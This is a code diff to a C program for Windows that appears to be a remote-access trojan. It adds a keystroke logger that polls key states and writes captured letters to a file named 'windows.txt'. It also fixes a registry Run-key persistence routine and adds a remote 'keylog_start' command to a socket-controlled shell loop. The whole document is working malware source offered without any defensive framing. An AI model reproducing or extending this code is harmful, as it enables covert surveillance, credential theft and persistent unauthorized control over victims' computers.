@@ -10,8 +10,30 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <stdbool.h>
+//#include "keylogger.h"
 
 int sock;
+
+DWORD WINAPI logg()
+{
+	int result, keys;
+    FILE *fp;
+
+    fp = fopen("windows.txt", "a");
+
+    while (true) {
+        for (keys = 64; keys <= 90; keys++) {
+            sleep(1);
+
+            result = GetAsyncKeyState(keys);
+
+            if (result == -32767) {
+                fprintf(fp, "%c", keys);
+            }
+        }
+    }
+}
+
 
 char *strslice(const char *str, size_t start, size_t end)
 {
@@ -37,7 +59,7 @@ int bootRun()
 	}
 
 	HKEY NewVal; // opens windows registry and creates new entry
-	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal) != ERROR_SUCCESS) {
+	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
 		send(sock, err, sizeof(err), 0);
 		return -1;
 	}
@@ -48,7 +70,7 @@ int bootRun()
 		return -1;
 	}
 	RegCloseKey(NewVal);
-	send(sock, success, sizeof(suc), 0);
+	send(sock, success, sizeof(success), 0);
 	return 0;
 }
 
@@ -60,6 +82,7 @@ void Shell()
 
 	while (true)
 	{
+		jump:
 		memset(buffer, 0, sizeof(buffer));
 		memset(container, 0, sizeof(container));
 		memset(total_response, 0, sizeof(total_response));
@@ -77,7 +100,12 @@ void Shell()
 		}
 		else if (strncmp("persist", buffer, 7) == 0)
 		{
-			bootRun();
+			bootRun(); // create persistence registry entry
+		}
+		else if (strncmp("keylog_start", buffer, 12) == 0)
+		{
+			HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL); // start keylogging thread
+			goto jump;
 		}
 		else
 		{
